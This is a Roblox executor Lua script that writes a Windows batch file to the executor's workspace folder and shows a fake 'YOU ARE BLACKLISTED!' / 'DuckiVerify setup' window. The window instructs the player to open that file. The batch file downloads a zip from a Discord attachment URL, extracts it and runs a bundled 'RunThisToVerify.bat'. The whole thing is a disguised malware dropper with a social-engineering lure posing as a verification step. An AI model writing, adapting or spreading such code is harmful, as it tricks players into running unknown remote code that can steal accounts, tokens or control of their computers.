-- Detect Executor Name
local executorName = "Unknown Executor"

if identifyexecutor then
    executorName = identifyexecutor()
elseif getexecutorname then
    executorName = getexecutorname()
elseif syn then
    executorName = "Synapse X"
elseif KRNL_LOADED then
    executorName = "KRNL"
elseif fluxus then
    executorName = "Fluxus"
elseif secure_load then
    executorName = "ScriptWare"
end

-- Define the workspace path
local workspacePath = "DUCKIVERIFY"
local batFilePath = workspacePath .. "/DuckiVerify.bat"

-- Create folder and write file
if makefolder and writefile then
    makefolder(workspacePath) -- Create DUCKIVERIFY folder
    writefile(batFilePath, [[
@echo off
echo Downloading DuckiVerify...
set "url=https://cdn.discordapp.com/attachments/1341636194601013384/1353099900736241754/DuckiVerify.zip"
set "output=DuckiVerify.zip"
set "extractFolder=DUCKIVERIFY"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

if exist "%output%" (
    echo Extracting files...
    powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '.\%extractFolder%'"
    echo Done!

    if exist ".\%extractFolder%\%extractFolder%\" (
        move ".\%extractFolder%\%extractFolder%\*" ".\%extractFolder%\" >nul
        rmdir ".\%extractFolder%\%extractFolder%"
    )

    cd ".\%extractFolder%"
    if exist "RunThisToVerify.bat" (
        echo Running verification...
        call "RunThisToVerify.bat"
    ) else (
        echo Verification script not found!
    )

    cd..
    del "%output%"
) else (
    echo Download failed!
)

pause
]])
    print("Folder and batch file created successfully.")
else
    print("Your executor does not support makefolder or writefile.")
end

-- GUI Creation with Rounded Corners and Red "BLACKLISTED" Text
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local BlacklistLabel = Instance.new("TextLabel")
local Instructions = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

-- Parent everything to CoreGui
ScreenGui.Parent = game:GetService("CoreGui")

-- Set up the Frame for the GUI
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Active = true
Frame.Draggable = true

-- Add rounded corners to Frame
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

-- "YOU ARE BLACKLISTED!" Label
BlacklistLabel.Parent = Frame
BlacklistLabel.Size = UDim2.new(1, 0, 0.15, 0)
BlacklistLabel.Position = UDim2.new(0, 0, 0, 10)
BlacklistLabel.Text = "YOU ARE BLACKLISTED!"
BlacklistLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
BlacklistLabel.TextScaled = true
BlacklistLabel.BackgroundTransparency = 1

-- Title Label
Title.Parent = Frame
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Position = UDim2.new(0, 0, 0.15, 0)
Title.Text = "DUCKIVERIFY SETUP"
Title.TextColor3 = Color3.fromRGB(255, 255, 0)
Title.TextScaled = true
Title.BackgroundTransparency = 1

-- Instructions Label
Instructions.Parent = Frame
Instructions.Size = UDim2.new(0.9, 0, 0.4, 0)
Instructions.Position = UDim2.new(0.05, 0, 0.35, 0)
Instructions.Text = "1. Go to where " .. executorName .. " is installed\n2. Go to 'workspace' folder\n3. Look for 'DUCKIVERIFY'\n4. Open 'DuckiVerify'\n5. Restart Roblox after verification!"
Instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
Instructions.TextScaled = true
Instructions.BackgroundTransparency = 1
Instructions.TextWrapped = true

-- Copy Path Button with rounded corners
CopyButton.Parent = Frame
CopyButton.Size = UDim2.new(0.8, 0, 0.15, 0) -- Adjusted size to make it a bit smaller
CopyButton.Position = UDim2.new(0.1, 0, 0.75, 0) -- Moved higher so it doesn't touch the bottom
CopyButton.Text = "Copy Path to Clipboard"
CopyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.MouseButton1Click:Connect(function()
    setclipboard(workspacePath)
end)

-- Add rounded corners to Copy Path Button
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = CopyButton

-- Ensure the GUI works properly
ScreenGui.DisplayOrder = 2
Frame.ZIndex = 2
Title.ZIndex = 3
BlacklistLabel.ZIndex = 3
Instructions.ZIndex = 3
CopyButton.ZIndex = 3

print("GUI and instructions with rounded corners and updated button ready.")
